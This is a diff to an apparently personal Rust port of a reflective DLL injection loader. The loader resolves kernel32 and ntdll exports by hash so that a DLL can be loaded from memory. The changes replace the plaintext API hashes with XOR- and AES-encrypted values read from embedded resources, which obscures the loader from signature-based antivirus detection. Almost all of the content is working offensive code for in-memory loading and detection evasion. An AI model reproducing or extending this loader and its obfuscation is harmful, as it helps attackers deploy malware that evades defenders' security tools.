@@ -1,20 +1,23 @@
 //my rust implementation of https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c
 #![allow(non_snake_case)]
 
-use crate::util::get_dll_base;
+use crate::util::{get_dll_base, get_resource_bytes};
 use crate::winapi::get_peb;
 use crate::winternals::*;
 use std::mem::size_of;
 use std::ptr::addr_of;
 use std::{fs, mem};
+use std::ops::Index;
+use crate::consts::*;
+use crate::crypto_util::{get_aes_encrypted_resource_bytes, get_xor_encrypted_string, get_xor_encrypted_string_unmapped};
 use crate::hash::{hash, hash_case_insensitive};
 
-const KERNEL32DLL_HASH: u32 = 0x6A4ABC5B;
-const NTDLLDLL_HASH: u32 = 0x3CFA685D;
-const LOADLIBRARYA_HASH: u32 = 0xEC0E4E8E;
-const GETPROCADDRESS_HASH: u32 = 0x7C0DFCAA;
-const VIRTUALALLOC_HASH: u32 = 0x91AFCA54;
-const NTFLUSHINSTRUCTIONCACHE_HASH: u32 = 0x534C0AB8;
+//const KERNEL32DLL_HASH: u32 = 0x6A4ABC5B;
+//const NTDLLDLL_HASH: u32 = 0x3CFA685D;
+//const LOADLIBRARYA_HASH: u32 = 0xEC0E4E8E;
+//const GETPROCADDRESS_HASH: u32 = 0x7C0DFCAA;
+//const VIRTUALALLOC_HASH: u32 = 0x91AFCA54;
+//const NTFLUSHINSTRUCTIONCACHE_HASH: u32 = 0x534C0AB8;
 
 #[no_mangle]
 pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
@@ -47,12 +50,15 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
         // get pointer to current modules name (unicode string)
         let pBuffer = (*pTruncLdrTableDataEntry).BaseDllName.Buffer as usize;
         // set bCounter to the length for the loop
-        let mut usCounter = (*pTruncLdrTableDataEntry).BaseDllName.Length  as usize;
+        let mut usCounter = (*pTruncLdrTableDataEntry).BaseDllName.Length as usize;
         // clear uiValueC which will store the hash of the module name
-        let dwModuleHash = hash_case_insensitive(pBuffer, usCounter);
+        let dwModuleHash = hash_case_insensitive(pBuffer, usCounter).to_ne_bytes();
+
+        let KERNEL32DLL_HASH = get_xor_encrypted_string(KERNEL32_DLL_HASH_POS, KERNEL32_DLL_HASH_KEY, KERNEL32_DLL_HASH_LEN);
+        let NTDLLDLL_HASH = get_xor_encrypted_string(NTDLL_DLL_HASH_POS, NTDLL_DLL_HASH_KEY, NTDLL_DLL_HASH_LEN);
 
         // compare the hash with that of kernel32.dll
-        if dwModuleHash == KERNEL32DLL_HASH {
+        if dwModuleHash == &KERNEL32DLL_HASH[..] {
             // get this modules base address
             let lpBaseAddress = (*pTruncLdrTableDataEntry).DllBase;
 
@@ -83,13 +89,20 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
 
             usCounter = 3;
 
+            //const LOADLIBRARYA_HASH: u32 = 0xEC0E4E8E;
+            //const GETPROCADDRESS_HASH: u32 = 0x7C0DFCAA;
+            //const VIRTUALALLOC_HASH: u32 = 0x91AFCA54;
+            let LOADLIBRARYA_HASH = get_xor_encrypted_string(LOADLIBRARYA_HASH_POS, LOADLIBRARYA_HASH_KEY, LOADLIBRARYA_HASH_LEN);
+            let GETPROCADDRESS_HASH = get_aes_encrypted_resource_bytes(GETPROCESSADDRESS_HASH_POS, GETPROCESSADDRESS_HASH_LEN);
+            let VIRTUALALLOC_HASH = get_aes_encrypted_resource_bytes(VIRTUALALLOC_HASH_POS, VIRTUALALLOC_HASH_LEN);
+
             while usCounter > 0 {
                 for i in 0..sNameArray.len() {
-                    let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);
+                    let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize).to_ne_bytes();
 
-                    if dwHashValue == LOADLIBRARYA_HASH
-                        || dwHashValue == GETPROCADDRESS_HASH
-                        || dwHashValue == VIRTUALALLOC_HASH
+                    if dwHashValue == &LOADLIBRARYA_HASH[..]
+                        || dwHashValue == &GETPROCADDRESS_HASH[..]
+                        || dwHashValue == &VIRTUALALLOC_HASH[..]
                     {
                         // get the VA for the array of addresses
                         let mut uiAddressArray =
@@ -102,11 +115,11 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
                         let pAddressRVA = uiAddressArray as *const u32;
 
                         // store this functions VA
-                        if dwHashValue == LOADLIBRARYA_HASH {
+                        if dwHashValue == &LOADLIBRARYA_HASH[..] {
                             pLoadLibraryA = lpBaseAddress + *pAddressRVA as usize;
-                        } else if dwHashValue == GETPROCADDRESS_HASH {
+                        } else if dwHashValue == &GETPROCADDRESS_HASH[..] {
                             pGetProcAddress = lpBaseAddress + *pAddressRVA as usize;
-                        } else if dwHashValue == VIRTUALALLOC_HASH {
+                        } else if dwHashValue == &VIRTUALALLOC_HASH[..] {
                             pVirtualAlloc = lpBaseAddress + *pAddressRVA as usize;
                         }
 
@@ -114,7 +127,7 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
                     }
                 }
             }
-        } else if dwModuleHash == NTDLLDLL_HASH {
+        } else if dwModuleHash == &NTDLLDLL_HASH[..] {
             // get this modules base address
             let lpBaseAddress = (*pTruncLdrTableDataEntry).DllBase;
 
@@ -145,11 +158,15 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
 
             usCounter = 1;
 
+            // 0x534C0AB8;
+            let NTFLUSHINSTRUCTIONCACHE_HASH = get_xor_encrypted_string(NTFLUSHINSTRUCTIONCACHE_HASH_POS, NTFLUSHINSTRUCTIONCACHE_HASH_KEY, NTFLUSHINSTRUCTIONCACHE_HASH_LEN);
+            //let NTFLUSHINSTRUCTIONCACHE_HASH = get_aes_encrypted_resource_bytes(NTFLUSHINSTRUCTIONCACHE_HASH_POS,NTFLUSHINSTRUCTIONCACHE_HASH_LEN);
+
             while usCounter > 0 {
                 for i in 0..sNameArray.len() {
-                    let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);
+                    let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize).to_ne_bytes();
 
-                    if dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH {
+                    if dwHashValue == &NTFLUSHINSTRUCTIONCACHE_HASH[..] {
                         // get the VA for the array of addresses
                         let mut uiAddressArray =
                             lpBaseAddress + (*uiExportDir).AddressOfFunctions as usize;
@@ -161,7 +178,7 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
                         let pAddressRVA = uiAddressArray as *const u32;
 
                         // store this functions VA
-                        if dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH {
+                        if dwHashValue == &NTFLUSHINSTRUCTIONCACHE_HASH[..4] {
                             pNtFlushInstructionCache = lpBaseAddress + *pAddressRVA as usize;
                         }
 
